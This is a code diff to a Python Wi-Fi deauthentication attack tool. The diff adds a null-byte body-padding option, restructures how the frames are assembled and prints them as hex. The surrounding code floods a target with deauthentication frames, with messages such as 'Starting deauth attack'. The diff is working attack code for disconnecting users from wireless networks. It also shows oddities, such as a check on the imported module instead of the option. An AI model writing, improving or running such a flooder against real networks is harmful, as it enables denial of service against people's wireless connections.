@@ -27,6 +27,7 @@ import struct
 import sys 
 import random
 import time
+import body
 from datetime import datetime
 
 def f_assem(args):
@@ -46,6 +47,7 @@ def f_assem(args):
     randfrag = args.randomfrag
     autoseq = args.autoseq
     dry = args.dryrun
+    body_bytes = args.body_pad
     verbose = args.verbose
 
     if any(arg in sys.argv for arg in ("-h", "--help")):
@@ -138,6 +140,7 @@ def main():
     randfrag = args.randomfrag
     autoseq = args.autoseq
     dry = args.dryrun
+    body_bytes = args.body_pad
 
     f_ctl, f_frag, f_dur, ct, src, net, ch, td, dr, src_n_v = f_assem(args)
     rad, vr, pad, rt_len, fp = radio.rt_head()
@@ -160,10 +163,9 @@ def main():
         print(dr)
 
     def reas():
-        # Body
         if not reason_code:
             rc = reason.reasoncode_input(0)
-        elif reason_code:
+        if reason_code:
             rc = reason.reasoncode_input(reason_code)
 
         return rc
@@ -229,9 +231,20 @@ def main():
             print(f"Reason Code: {reason.reasoncode_input(0).hex()} - {reason.def_code(0)}")
         if reason_code:
             print(f"Reason Code: {reason.reasoncode_input(reason_code).hex()} - {reason.def_code(reason_code)}")
+        if body:
+            print(f"Body padding: {body_bytes} null bytes padded")
         print("-" * 100)
 
     r = reas()
+    sq = fs()
+    if body_bytes:
+        b = body.body_inject(body_bytes)
+        frame = df + sq + r + b
+    if not body_bytes:
+        frame = df + sq + r
+    frme = frame.hex().upper()
+    frmes = ''.join([f'\\x{frme[i:i+2]}' for i in range(0, len(frme), 2)])
+    print(f'Frame: {frmes}')
 
     if frame_flood:
         nmframe = 1
@@ -241,7 +254,7 @@ def main():
         try:
             tg = ct.hex().upper()
             tgt = ''.join([f'\\x{tg[i:i+2]}' for i in range(0, len(tg), 2)])
-            print("Starting deauth attack")
+            print("Starting deauth attack") 
             print(f"Flooding: {tgt}\nEnd attack with CTRL + C")
             if num_frames:
                 n = num_frames
@@ -256,8 +269,6 @@ def main():
                 t = .1
             while nmframe != n:
                 try:
-                    sq = fs()
-                    frame = df + sq + r
                     if not dry:
                         s.send(frame)
                     time.sleep(t)
@@ -305,15 +316,10 @@ def main():
             print("Starting deauth attack")
             for i in range(n):
                 try:
-                    sq = fs()
-                    frame = df + sq + r
                     if not dry:
                         s.send(frame)
                     if verbose:
                         print(f"Sending frame: {i + 1}/{n}")
-                        frme = frame.hex().upper()
-                        frmes = ''.join([f'\\x{frme[i:i+2]}' for i in range(0, len(frme), 2)])
-                        print(frmes)
                         if timedelay:
                             if ti == 0:
                                 print("")
